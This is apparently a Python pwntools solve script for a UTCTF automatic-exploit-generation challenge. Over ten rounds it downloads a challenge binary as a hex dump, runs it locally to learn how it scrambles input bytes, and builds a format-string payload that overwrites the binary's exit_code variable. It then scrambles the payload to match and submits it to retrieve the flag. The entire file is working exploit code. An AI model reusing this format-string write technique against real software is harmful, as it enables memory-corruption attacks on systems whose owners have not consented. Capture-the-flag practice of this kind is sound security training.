#!/usr/bin/env python3

from pwn import *

def getbinary(r):
	f = open('./aeg2','wb')

	while True:
		_ = r.recvline()
		if b'0: ' in _:
			for i in _.split()[1:9]: f.write(int(i,16).to_bytes(2,'big'))
		if b'Binary' in _:
			ec = int(_.decode().strip().split()[-1],10)
			break

	f.close()
	os.chmod('./aeg2', 0o0755)
	return ec


r = remote('pwn.utctf.live', 5002)
r.sendline()

for z in range(10):
	ec = getbinary(r)
	log.info(f'ec: {ec}')

	binary = context.binary = ELF('./aeg2',checksec=False)

	m = 512 * [0]
	for i in range(4):
		s = (i * 128) * [ord(b'A')] + list(range(128,256)) + ((3 - i) * 128) * [ord(b'A')]
		context.log_level = 'WARN'
		p = process(binary.path)
		p.sendline(bytes(s))
		_ = [*p.recvline().strip()]
		p.close()
		context.log_level = 'INFO'
		for j in range(128,256): m[i * 128 + (j - 128)] = _.index(j)

	offset = 8
	payload  = b''
	payload += fmtstr_payload(offset,{binary.sym.exit_code:ec})
	payload += (0x200 - len(payload)) * b'\0'

	s = 512 * [0]
	for i in range(0x200): s[m.index(i)] = payload[i]
		
	r.sendlineafter(b'input: \n',bytes(s))
	os.rename('./aeg2','./aeg2.' + str(z))

r.recvuntil(b'utflag{')
flag = 'utflag{' + r.recvuntil(b'}').strip().decode()
r.close()
print(flag)
